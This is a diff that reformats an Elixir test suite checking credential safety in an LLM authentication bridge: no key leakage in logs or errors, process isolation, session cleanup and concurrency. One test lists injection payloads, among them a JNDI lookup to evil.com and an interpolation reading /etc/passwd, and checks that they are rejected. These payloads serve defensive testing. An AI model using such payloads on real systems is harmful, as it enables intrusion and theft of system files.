@@ -55,26 +55,28 @@ defmodule Jido.AI.ReqLlmBridge.Security.CredentialSafetyTest do
         end)
 
         # Capture any logs that might contain the key
-        log_output = capture_log(fn ->
-          {:error, error_message} = Authentication.authenticate_for_provider(:openai, %{})
+        log_output =
+          capture_log(fn ->
+            {:error, error_message} = Authentication.authenticate_for_provider(:openai, %{})
 
-          # Error message should not contain the full sensitive key
-          assert not String.contains?(error_message, sensitive_key),
-            "Sensitive key exposed in error message: #{error_message}"
+            # Error message should not contain the full sensitive key
+            assert not String.contains?(error_message, sensitive_key),
+                   "Sensitive key exposed in error message: #{error_message}"
 
-          # Error message should not contain key fragments longer than 8 chars
-          key_fragments = String.split(sensitive_key, "-")
-          for fragment <- key_fragments do
-            if String.length(fragment) > 8 do
-              assert not String.contains?(error_message, fragment),
-                "Key fragment exposed in error: #{fragment}"
+            # Error message should not contain key fragments longer than 8 chars
+            key_fragments = String.split(sensitive_key, "-")
+
+            for fragment <- key_fragments do
+              if String.length(fragment) > 8 do
+                assert not String.contains?(error_message, fragment),
+                       "Key fragment exposed in error: #{fragment}"
+              end
             end
-          end
-        end)
+          end)
 
         # Log output should not contain sensitive keys
         assert not String.contains?(log_output, sensitive_key),
-          "Sensitive key exposed in logs: #{log_output}"
+               "Sensitive key exposed in logs: #{log_output}"
       end
     end
 
@@ -98,11 +100,12 @@ defmodule Jido.AI.ReqLlmBridge.Security.CredentialSafetyTest do
         assert headers["authorization"] == "Bearer #{sensitive_key}"
 
         # But debug/inspect of the result should not expose keys in logs
-        log_output = capture_log(fn ->
-          # Simulate potential debug logging
-          require Logger
-          Logger.debug("Authentication result: #{inspect({:ok, headers, key})}")
-        end)
+        log_output =
+          capture_log(fn ->
+            # Simulate potential debug logging
+            require Logger
+            Logger.debug("Authentication result: #{inspect({:ok, headers, key})}")
+          end)
 
         # This test verifies our logging doesn't expose keys
         # (In production, such debug logging should be avoided entirely)
@@ -118,7 +121,8 @@ defmodule Jido.AI.ReqLlmBridge.Security.CredentialSafetyTest do
         "sk-invalid-but-potentially-real-key",
         "sk-ant-fake-but-sensitive-looking",
         "AIzaSyD-could-be-real-google-key",
-        ""  # Empty key test
+        # Empty key test
+        ""
       ]
 
       providers = [:openai, :anthropic, :google, :cloudflare, :openrouter]
@@ -132,14 +136,14 @@ defmodule Jido.AI.ReqLlmBridge.Security.CredentialSafetyTest do
               # Error messages should not echo back potentially sensitive data
               if String.length(invalid_key) > 10 do
                 assert not String.contains?(error_message, invalid_key),
-                  "Potentially sensitive key exposed in validation error: #{error_message}"
+                       "Potentially sensitive key exposed in validation error: #{error_message}"
               end
 
               # Generic error messages are preferred for security
               assert String.contains?(error_message, "API key") or
-                     String.contains?(error_message, "Invalid") or
-                     String.contains?(error_message, "format"),
-                "Error message should be generic: #{error_message}"
+                       String.contains?(error_message, "Invalid") or
+                       String.contains?(error_message, "format"),
+                     "Error message should be generic: #{error_message}"
 
             :ok ->
               # Some invalid keys might pass format checks - that's ok for this test
@@ -157,24 +161,26 @@ defmodule Jido.AI.ReqLlmBridge.Security.CredentialSafetyTest do
       main_pid = self()
 
       # Test that child processes cannot access parent's sensitive data
-      child_task = Task.async(fn ->
-        # Child should not see parent's authentication without explicit inheritance
-        case SessionAuthentication.get_for_request(:openai, %{}) do
-          {:session_auth, options} ->
-            # If somehow accessible, ensure it's not the sensitive key
-            child_key = options[:api_key]
-            {:contamination_detected, child_key}
+      child_task =
+        Task.async(fn ->
+          # Child should not see parent's authentication without explicit inheritance
+          case SessionAuthentication.get_for_request(:openai, %{}) do
+            {:session_auth, options} ->
+              # If somehow accessible, ensure it's not the sensitive key
+              child_key = options[:api_key]
+              {:contamination_detected, child_key}
 
-          {:no_session_auth} ->
-            :properly_isolated
-        end
-      end)
+            {:no_session_auth} ->
+              :properly_isolated
+          end
+        end)
 
       child_result = Task.await(child_task)
 
       case child_result do
         :properly_isolated ->
-          :ok  # Expected behavior
+          # Expected behavior
+          :ok
 
         {:contamination_detected, leaked_key} ->
           flunk("Session isolation failed: child process accessed parent's key: #{leaked_key}")
@@ -198,13 +204,14 @@ defmodule Jido.AI.ReqLlmBridge.Security.CredentialSafetyTest do
       SessionAuthentication.set_for_provider(:openai, sensitive_key)
 
       # Capture debug logs during authentication
-      log_output = capture_log(fn ->
-        {:ok, _headers, _key} = Authentication.authenticate_for_provider(:openai, %{})
-      end)
+      log_output =
+        capture_log(fn ->
+          {:ok, _headers, _key} = Authentication.authenticate_for_provider(:openai, %{})
+        end)
 
       # Debug logs should mask the key
       assert not String.contains?(log_output, sensitive_key),
-        "Unmasked key in debug logs: #{log_output}"
+             "Unmasked key in debug logs: #{log_output}"
 
       # Should contain masked version if any logging occurred
       if String.contains?(log_output, "authentication") do
@@ -217,8 +224,9 @@ defmodule Jido.AI.ReqLlmBridge.Security.CredentialSafetyTest do
           key_start = String.slice(sensitive_key, 0, 8)
           key_end = String.slice(sensitive_key, -8, 8)
 
-          assert not (String.contains?(log_output, key_start) and String.contains?(log_output, key_end)),
-            "Potential key leakage in logs without proper masking: #{log_output}"
+          assert not (String.contains?(log_output, key_start) and
+                        String.contains?(log_output, key_end)),
+                 "Potential key leakage in logs without proper masking: #{log_output}"
         end
       end
     end
@@ -273,13 +281,16 @@ defmodule Jido.AI.ReqLlmBridge.Security.CredentialSafetyTest do
             ]
 
             for pattern <- sensitive_patterns do
-              assert not String.contains?(String.downcase(error_message), String.downcase(pattern)),
-                "System information leaked in error: #{error_message}"
+              assert not String.contains?(
+                       String.downcase(error_message),
+                       String.downcase(pattern)
+                     ),
+                     "System information leaked in error: #{error_message}"
             end
 
             # Error should be generic
             assert String.contains?(error_message, "API key not found"),
-              "Error should be user-friendly: #{error_message}"
+                   "Error should be user-friendly: #{error_message}"
 
           other ->
             flunk("Unexpected result from authentication: #{inspect(other)}")
@@ -296,31 +307,34 @@ defmodule Jido.AI.ReqLlmBridge.Security.CredentialSafetyTest do
         "${jndi:ldap://evil.com/a}",
         "%00admin%00",
         "{{7*7}}",
-        "#{File.read!('/etc/passwd')}"  # Elixir injection attempt
+        # Elixir injection attempt
+        "#{File.read!(~c'/etc/passwd')}"
       ]
 
       providers = [:openai, :anthropic, :google]
 
       for provider <- providers do
         for malicious_input <- malicious_inputs do
-          {:error, error_message} = ProviderAuthRequirements.validate_auth(provider, malicious_input)
+          {:error, error_message} =
+            ProviderAuthRequirements.validate_auth(provider, malicious_input)
 
           # Error messages should be sanitized and generic
           assert not String.contains?(error_message, malicious_input),
-            "Malicious input echoed in error: #{error_message}"
+                 "Malicious input echoed in error: #{error_message}"
 
           # Should not contain system paths or sensitive info
           dangerous_patterns = ["/etc/", "/home/", "root:", "admin", "password"]
+
           for pattern <- dangerous_patterns do
             assert not String.contains?(String.downcase(error_message), pattern),
-              "Dangerous pattern in error message: #{error_message}"
+                   "Dangerous pattern in error message: #{error_message}"
           end
 
           # Error should be generic validation message
           assert String.contains?(error_message, "Invalid") or
-                 String.contains?(error_message, "API key") or
-                 String.contains?(error_message, "format"),
-            "Error should be generic validation message: #{error_message}"
+                   String.contains?(error_message, "API key") or
+                   String.contains?(error_message, "format"),
+                 "Error should be generic validation message: #{error_message}"
         end
       end
     end
@@ -332,35 +346,37 @@ defmodule Jido.AI.ReqLlmBridge.Security.CredentialSafetyTest do
       num_processes = 5
       base_key = "sk-isolation-test"
 
-      isolation_tasks = for process_id <- 1..num_processes do
-        Task.async(fn ->
-          # Each process has its own sensitive key
-          my_sensitive_key = "#{base_key}-process-#{process_id}"
-          SessionAuthentication.set_for_provider(:openai, my_sensitive_key)
+      isolation_tasks =
+        for process_id <- 1..num_processes do
+          Task.async(fn ->
+            # Each process has its own sensitive key
+            my_sensitive_key = "#{base_key}-process-#{process_id}"
+            SessionAuthentication.set_for_provider(:openai, my_sensitive_key)
 
-          # Wait for other processes to set their keys
-          :timer.sleep(50)
+            # Wait for other processes to set their keys
+            :timer.sleep(50)
 
-          # Verify I only see my own key
-          {:session_auth, options} = SessionAuthentication.get_for_request(:openai, %{})
-          retrieved_key = options[:api_key]
+            # Verify I only see my own key
+            {:session_auth, options} = SessionAuthentication.get_for_request(:openai, %{})
+            retrieved_key = options[:api_key]
 
-          # Should be my key
-          assert retrieved_key == my_sensitive_key,
-            "Process #{process_id} got wrong key: #{retrieved_key}"
+            # Should be my key
+            assert retrieved_key == my_sensitive_key,
+                   "Process #{process_id} got wrong key: #{retrieved_key}"
 
-          # Should not be any other process's key
-          for other_id <- 1..num_processes do
-            if other_id != process_id do
-              other_key = "#{base_key}-process-#{other_id}"
-              assert retrieved_key != other_key,
-                "Process #{process_id} got process #{other_id}'s key: #{retrieved_key}"
+            # Should not be any other process's key
+            for other_id <- 1..num_processes do
+              if other_id != process_id do
+                other_key = "#{base_key}-process-#{other_id}"
+
+                assert retrieved_key != other_key,
+                       "Process #{process_id} got process #{other_id}'s key: #{retrieved_key}"
+              end
             end
-          end
 
-          {process_id, retrieved_key}
-        end)
-      end
+            {process_id, retrieved_key}
+          end)
+        end
 
       # Wait for all processes and verify results
       results = Task.await_many(isolation_tasks, 5_000)
@@ -370,13 +386,14 @@ defmodule Jido.AI.ReqLlmBridge.Security.CredentialSafetyTest do
       unique_keys = Enum.uniq(keys)
 
       assert length(keys) == length(unique_keys),
-        "Process isolation failed - duplicate keys found: #{inspect(keys)}"
+             "Process isolation failed - duplicate keys found: #{inspect(keys)}"
 
       # Verify each key matches expected pattern
       for {process_id, key} <- results do
         expected_key = "#{base_key}-process-#{process_id}"
+
         assert key == expected_key,
-          "Process #{process_id} key mismatch: got #{key}, expected #{expected_key}"
+               "Process #{process_id} key mismatch: got #{key}, expected #{expected_key}"
       end
     end
 
@@ -406,14 +423,16 @@ defmodule Jido.AI.ReqLlmBridge.Security.CredentialSafetyTest do
       # Verify complete cleanup
       for provider <- providers do
         result = SessionAuthentication.get_for_request(provider, %{})
+
         assert result == {:no_session_auth},
-          "Session data persisted after cleanup for #{provider}: #{inspect(result)}"
+               "Session data persisted after cleanup for #{provider}: #{inspect(result)}"
       end
 
       # Verify no providers are listed as having authentication
       remaining_providers = SessionAuthentication.list_providers_with_auth()
+
       assert remaining_providers == [],
-        "Providers still listed after cleanup: #{inspect(remaining_providers)}"
+             "Providers still listed after cleanup: #{inspect(remaining_providers)}"
 
       # Double-check by attempting authentication
       # (should fail and fall back to external sources)
@@ -435,35 +454,37 @@ defmodule Jido.AI.ReqLlmBridge.Security.CredentialSafetyTest do
       provider = :openai
       num_concurrent_operations = 20
 
-      concurrent_tasks = for operation_id <- 1..num_concurrent_operations do
-        Task.async(fn ->
-          operation_key = "sk-concurrent-#{operation_id}"
+      concurrent_tasks =
+        for operation_id <- 1..num_concurrent_operations do
+          Task.async(fn ->
+            operation_key = "sk-concurrent-#{operation_id}"
 
-          # Perform rapid set/get/clear operations
-          SessionAuthentication.set_for_provider(provider, operation_key)
+            # Perform rapid set/get/clear operations
+            SessionAuthentication.set_for_provider(provider, operation_key)
 
-          # Brief random delay to increase chance of race conditions
-          :timer.sleep(:rand.uniform(10))
+            # Brief random delay to increase chance of race conditions
+            :timer.sleep(:rand.uniform(10))
 
-          # Try to retrieve (might get this key or another concurrent one)
-          result = SessionAuthentication.get_for_request(provider, %{})
+            # Try to retrieve (might get this key or another concurrent one)
+            result = SessionAuthentication.get_for_request(provider, %{})
 
-          # Clear this operation's key
-          SessionAuthentication.clear_for_provider(provider)
+            # Clear this operation's key
+            SessionAuthentication.clear_for_provider(provider)
 
-          case result do
-            {:session_auth, options} ->
-              retrieved_key = options[:api_key]
-              # Should be some valid concurrent operation key
-              assert String.starts_with?(retrieved_key, "sk-concurrent-"),
-                "Invalid key format in concurrent operation: #{retrieved_key}"
-              {operation_id, :got_key, retrieved_key}
+            case result do
+              {:session_auth, options} ->
+                retrieved_key = options[:api_key]
+                # Should be some valid concurrent operation key
+                assert String.starts_with?(retrieved_key, "sk-concurrent-"),
+                       "Invalid key format in concurrent operation: #{retrieved_key}"
 
-            {:no_session_auth} ->
-              {operation_id, :no_key, nil}
-          end
-        end)
-      end
+                {operation_id, :got_key, retrieved_key}
+
+              {:no_session_auth} ->
+                {operation_id, :no_key, nil}
+            end
+          end)
+        end
 
       # Wait for all concurrent operations
       concurrent_results = Task.await_many(concurrent_tasks, 10_000)
@@ -475,13 +496,14 @@ defmodule Jido.AI.ReqLlmBridge.Security.CredentialSafetyTest do
       # All retrieved keys should be valid concurrent operation keys
       for key <- unique_keys do
         assert String.starts_with?(key, "sk-concurrent-"),
-          "Invalid key retrieved during concurrent operations: #{key}"
+               "Invalid key retrieved during concurrent operations: #{key}"
       end
 
       # Final state should be clean (all operations cleared their keys)
       final_result = SessionAuthentication.get_for_request(provider, %{})
+
       assert final_result == {:no_session_auth},
-        "Session not properly cleaned after concurrent operations: #{inspect(final_result)}"
+             "Session not properly cleaned after concurrent operations: #{inspect(final_result)}"
     end
   end
 end
